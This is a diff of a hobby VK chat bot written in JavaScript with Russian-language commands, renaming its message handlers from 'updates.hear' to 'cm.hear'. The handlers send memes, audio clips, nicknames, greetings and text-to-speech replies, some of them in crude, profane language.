@@ -8032,7 +8024,7 @@ updates.hear(/^(?:развод)/i, message => {
 	return message.send(`❤  Вы успешно развелись!`);
 });
 
-vk.updates.hear(/^(?:cid)/i, message => {
+cm.hear(/^(?:cid)/i, message => {
 	return message.reply(`ID Чата:` + message.chatId);
 });
 
@@ -8059,7 +8051,7 @@ vk.updates.hear(/^Мурр/i, async (context) => {
 	await Promise.all([context.send('Мурчу..'), context.sendAudioMessage(link)]);
 });
 
-updates.hear(/^мурк/i, async (context) => { 
+cm.hear(/^мурк/i, async (context) => { 
 	if(context.user != 402143077) return context.send(`⚠А ТЫ ЗНАЛ...именно ты, иди нахуй⚠`); 
 	const gs = ["http://psv4.userapi.com/c852328//u551446603/audiomsg/d2/54cb4c5d13.mp3"]; 
 	const link = gs[Math.floor(Math.random() * gs.length)]; 
@@ -8200,7 +8192,7 @@ vk.updates.hear(/^(?:!tkick|!ткик)\s?([0-9]+)?\s([0-9]+)?\s([^]+)?/i, (messa
 		return message.send(`Success procces | @id${id} (user) dell chat #${ch}`)	 
 	});
 
-updates.hear(/^(?:Привет, как дела)/i, (message) => { 
+cm.hear(/^(?:Привет, как дела)/i, (message) => { 
 	vk.api.call('users.get', {user_id: message.user}).then((res) => {let e = res[0];
 		return message.send(`Привет, @id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name})! У меня всё хорошо. А у тебя как?`);
 	});
@@ -8210,7 +8202,7 @@ vk.updates.hear(/^(?:бдсм)/i, (message) => {
 	return message.send({sticker_id: 1938});
 })
 
-updates.hear(/^(?:!me)\s([^]+)/i, (message) => { 
+cm.hear(/^(?:!me)\s([^]+)/i, (message) => { 
 	let user = acc.users[user_id(message.user)];
 	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
 	let text = message.$match[1] 
@@ -8233,7 +8225,7 @@ vk.updates.hear(/^котик/i, async (context) => {
 	await Promise.all([context.send('В ожидании чуда 😻'), context.sendPhoto('https://loremflickr.com/400/300/')]);
 });
 
-updates.hear(/^(?:мем|фото|мемасик|мемчик)/i, async(message) => {
+cm.hear(/^(?:мем|фото|мемасик|мемчик)/i, async(message) => {
 	let {
 		items
 	} = await user.api.wall.get({
@@ -8248,7 +8240,7 @@ updates.hear(/^(?:мем|фото|мемасик|мемчик)/i, async(message)
 	});
 });
 
-updates.hear(/^(?:видео|видос)\s(.*)$/i, async(message) => {
+cm.hear(/^(?:видео|видос)\s(.*)$/i, async(message) => {
 	if(message.isChat) return message.send(`Псс, пишов в лс со мной, там и пиши!`)
 		user.api.call('video.search', {
 			q: message.$match[1],
@@ -8263,12 +8255,12 @@ updates.hear(/^(?:видео|видос)\s(.*)$/i, async(message) => {
 		})
 	});
 
-updates.hear(/^(?:абг)/i, (message) => {
+cm.hear(/^(?:абг)/i, (message) => {
 	if(message.user != 347241116) return message.send(`Это просто АБГ, что тут не понятного.`)
 		message.send(`Согласен с тобой повелитель!`)
 })
 
-updates.hear(/^(?:upt)/i, message => {
+cm.hear(/^(?:upt)/i, message => {
 	message.send(`
 		🔺Uptime: Время с момента включения/перезапуска бота.🔺
 
@@ -8278,18 +8270,18 @@ updates.hear(/^(?:upt)/i, message => {
 		`);
 });
 
-updates.hear(/^(?:Рник)/i, (message) => {
+cm.hear(/^(?:Рник)/i, (message) => {
 	let nicks = ["☜❶☞Limbo☜❶☞", "D҉O҉N҉A҉T҉҉1K҉", "Føxŷ", "ОпАSнЫй_ВоЗрАSт", "He}I{g@H4uk", "Д)(øķêp", "Cr1stal", "^-^МаJlыш^-^", "The_myst3", "PozziBros", "*Limon4k*", "_Marcus_03", "Ŧøթҹนķ", "ẌūℒΐǤắ₦", "3Jlou_4uTep", ">>¥¥♔Limbo♔¥¥<<", "СвяТой_ТапоК", "N.E.V.E.N", "_LegenDa_", "Lиsичка", "çŤрẮχ", "DarK_Knigt", "Đéɱǿή", "_MaRiXyAnA_", "KiSS_Ka", "ѼЯϬӅѲҶҟӨѼ", "DUBERMAN", "Sexy_ПуПоК", "♛ĂʟӍάƷ♛ツ", "-=FOX=-", "Э)̅ζь√ИРа", "❤ОчฉpσßฉτеJlьทฉศ_ðеßσчkฉ❤", "รקคгтคςυร", "●•✪Ďofẵ✪•●", "W1zarD", "Kikus", "๖ۣۣۜC๖ۣۣۜA๖ۣۣۜR๖ۣۣۜL๖ۣۣۜO๖ۣۣۜS", "***ℳტᗫᎯℜტ***", "KyKyPy3a", "˜”*°•.♥.•°*”˜", "(つ•̀ᴥ•́)つ*:･ﾟ✧", "$.c.o.R.p.!.O.N", "♔Lucky♔", "†МОНАХ†", "G_O_D", "Sk1pe", "Д.Р.Э.Й", "n1k3~", "VΛCUUM", "☭СССР☭", "Do-Mi-Rek", "Ate1st", "4uD@4oK", "(●̮̮̃●̃)DaD(●̮̮̃●̃)", "Ф-Е-Н-И-К-С", "n1ce*", "FaN@t!k", "ǷȫѮѦ", "๏̯͡๏ищу♥теЂя๏̯͡๏", "◄₡ẫ✘ø₱ǿҜ►"].random()
 	return message.send(`Предлагаю тебе вот этот: ${nicks}`);
 });
 
-updates.hear(/^(?:time)/i, message => {
+cm.hear(/^(?:time)/i, message => {
 	return message.send(`Точное время у @id287908009(Артёма): \n----------------------
 		${time(1)} (МСК)
 		`);
 });
 
-updates.hear(/^(?:анечка,|анечка)/i, message => {
+cm.hear(/^(?:анечка,|анечка)/i, message => {
 	const googleTTS = require('google-tts-api');
 	
 	rq("https://isinkin-bot-api.herokuapp.com/1/talk?q=" + encodeURIComponent(message.text)).then(res => {
@@ -8301,7 +8293,7 @@ googleTTS(res.text, 'ru', 2.5)   // speed normal = 1 (default), slow = 0.24
 });
 
 
-updates.hear(/^(?:scr)\s(.*)/i, async(message) => {
+cm.hear(/^(?:scr)\s(.*)/i, async(message) => {
 	
 	message.sendPhoto("http://mini.s-shot.ru/RU?" + message.$match[1])
 })
@@ -8328,7 +8320,7 @@ vk.updates.hear(/^(?:hit)\s?([0-9]+)?/i, (message) => {
 	return message.send(`❤ @id${user.id}(${user.prefix}), вы уебали [${acc.users[message.$match[1]].prefix}]`);
 }); 
 
-updates.hear(/^(?:группа)/i, (message) => {
+cm.hear(/^(?:группа)/i, (message) => {
 
 	return message.send(`[bot.anya|Ссылка на нашу группу: ]`, {
 		attachment: 'photo-179084056_456239099'
@@ -8520,7 +8512,7 @@ if(!message.$match[1]) return message.send(`ОШИБКА ! 😱\n Подсказ
 });  
 */
 
-updates.hear(/^(?:Обнять)\s?([^]+)?$/i, async(message) => {
+cm.hear(/^(?:Обнять)\s?([^]+)?$/i, async(message) => {
 	let smiless = [':)', ' :(', ' :D', ' :c', ' :3', ' :/']
 	let smiles = [{
 		smile: ':)'
@@ -8671,7 +8663,7 @@ vk.updates.hear(/^(?:элитмагаз)$/i,  (message) => {
 		`)
 });	
 
-updates.hear(/^(?:id|ид)$/i, (message) => {
+cm.hear(/^(?:id|ид)$/i, (message) => {
 	if(message.forwards[0]){
 		let id = message.forwards[0].senderId;
 
@@ -9313,7 +9305,7 @@ vk.updates.hear(/^(?:!setname)\s([^]+)?/i, (message) => {
 	return message.send({sticker_id:10349});
 });
 
-updates.hear(/^rega/i, async (context) => {
+cm.hear(/^rega/i, async (context) => {
 	const gs = ['https://psv4.userapi.com/c853024//u347241116/audiomsg/d17/ccbf44a4cb.mp3'];
 	const link = gs[Math.floor(Math.random() * gs.length)];
 	await Promise.all([context.sendAudioMessage(link)]);
